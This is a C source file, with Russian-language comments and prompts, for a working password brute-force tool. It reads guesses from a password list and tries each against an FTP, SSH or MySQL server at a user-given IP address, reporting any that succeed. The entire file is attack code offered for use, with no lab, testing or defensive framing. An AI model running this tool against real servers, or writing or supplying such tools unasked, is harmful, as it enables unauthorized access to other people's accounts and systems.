#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <libssh2.h> // Для SSH
#include <mysql/mysql.h> // Для MySQL

#define BUFFER_SIZE 1024
#define MAX_PASSWORD_LENGTH 100

// ANSI escape codes for colored output
#define GREEN "\033[0;32m"
#define RESET "\033[0m"

// Функции для брутфорса по протоколам
void brute_force_ftp(const char *ip, const char *username, const char *password);
void brute_force_ssh(const char *ip, const char *username, const char *password);
void brute_force_mysql(const char *ip, const char *username, const char *password);

void brute_force(const char *protocol, const char *ip, const char *username, const char *password) {
    if (strcmp(protocol, "ftp") == 0) {
        brute_force_ftp(ip, username, password);
    } else if (strcmp(protocol, "ssh") == 0) {
        brute_force_ssh(ip, username, password);
    } else if (strcmp(protocol, "mysql") == 0) {
        brute_force_mysql(ip, username, password);
    } else {
        printf("Неизвестный протокол: %s\n", protocol);
    }
}

void brute_force_ftp(const char *ip, const char *username, const char *password) {
    int sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Не удалось создать сокет");
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(21); // Порт FTP
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Ошибка подключения");
        close(sock);
        return;
    }

    recv(sock, buffer, BUFFER_SIZE, 0);
    sprintf(buffer, "USER %s\r\n", username);
    send(sock, buffer, strlen(buffer), 0);
    recv(sock, buffer, BUFFER_SIZE, 0);
    sprintf(buffer, "PASS %s\r\n", password);
    send(sock, buffer, strlen(buffer), 0);
    recv(sock, buffer, BUFFER_SIZE, 0);

    if (strstr(buffer, "230") != NULL) {
        printf(GREEN "Успешный вход с паролем: %s\n" RESET, password);
    } else {
        printf("Неверный пароль: %s\n", password);
    }

    close(sock);
}

void brute_force_ssh(const char *ip, const char *username, const char *password) {
    LIBSSH2_SESSION *session;
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Не удалось создать сокет");
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(22); // Порт SSH
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) != 0) {
        perror("Ошибка подключения");
        close(sock);
        return;
    }

    session = libssh2_session_init();
    libssh2_session_handshake(session, sock); // Используем новую функцию

    if (libssh2_userauth_password(session, username, password) == 0) {
        printf(GREEN "Успешный вход с паролем: %s\n" RESET, password);
    } else {
        printf("Неверный пароль: %s\n", password);
    }

    libssh2_session_disconnect(session, "Normal Shutdown");
    libssh2_session_free(session);
    close(sock);
}

void brute_force_mysql(const char *ip, const char *username, const char *password) {
    MYSQL *conn;
    conn = mysql_init(NULL);
    if (mysql_real_connect(conn, ip, username, password, NULL, 0, NULL, 0)) {
        printf(GREEN "Успешный вход с паролем: %s\n" RESET, password);
    } else {
        printf("Неверный пароль: %s\n", password);
    }
    mysql_close(conn);
}

int main() {
    char ip[16];
    char username[50];
    char password[MAX_PASSWORD_LENGTH];
    char protocol[10];
    FILE *file;

    printf("Выберите протокол (ftp, ssh, mysql): ");
    scanf("%9s", protocol);
    printf("Введите IP-адрес сервера: ");
    scanf("%15s", ip);
    printf("Введите имя пользователя: ");
    scanf("%49s", username);

    file = fopen("passwords.txt", "r");
    if (file == NULL) {
        perror("Не удалось открыть файл с паролями");
        return 1;
    }

    while (fgets(password, MAX_PASSWORD_LENGTH, file) != NULL) {
        password[strcspn(password, "\n")] = 0;
        printf("Пробуем пароль: %s\n", password);
        brute_force(protocol, ip, username, password);
        sleep(1); // Задержка в 1 секунду
    }

    fclose(file);
    return 0;
}
